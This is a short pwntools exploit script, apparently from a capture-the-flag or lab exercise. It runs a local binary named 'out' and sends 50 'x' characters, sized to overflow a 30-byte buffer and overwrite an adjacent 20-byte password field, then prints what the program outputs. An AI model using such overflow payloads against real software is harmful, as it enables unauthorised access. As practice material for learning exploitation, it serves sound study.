from pwn import *

p = process("./out");
buf_len=30
pass_len=20
payload_len = buf_len + pass_len

payload = 'x'*payload_len
p.sendline(payload)

data = p.readall().strip().decode().splitlines()
for line in data:
	print(line)
